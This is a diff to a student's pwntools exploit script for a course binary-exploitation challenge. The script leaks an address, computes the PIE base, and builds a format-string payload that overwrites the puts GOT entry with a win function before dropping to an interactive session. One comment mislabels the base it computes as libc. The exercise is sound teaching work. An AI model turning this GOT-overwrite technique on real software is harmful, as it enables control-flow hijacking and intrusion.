@@ -2,7 +2,7 @@
 Creators:       Malachi Parks
 Section:        CPEG476-010
 Assignment:     Project 2 --- chall_12
-File Description:  
+File Description:  Like chall_11 with PIE
 
 Checksec info:
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
@@ -38,5 +38,21 @@ leak = p.recvuntil(b"\n")
 leakInt = int(leak,16)
 print("LEAK: ", leakInt)
 
+# Set base of libc
+elf.address = leakInt - elf.sym.main
+
 # What to write, going to write address of win pretty much over GOT of puts
 what = elf.sym.win
+
+# Target == puts, since called after gets
+target = elf.got.puts
+
+payload = fmtstr_payload(offset,{target:what})      # Pretty much overwrite the entire start of it using $16hhn
+print("PAYLOAD: ", payload)
+p.sendline(payload)
+
+# Recieve up till nulls to send line
+null = payload.find(b'\x00')
+p.recvuntil(payload[null-3:null])   # Catch all nulls
+
+p.interactive()
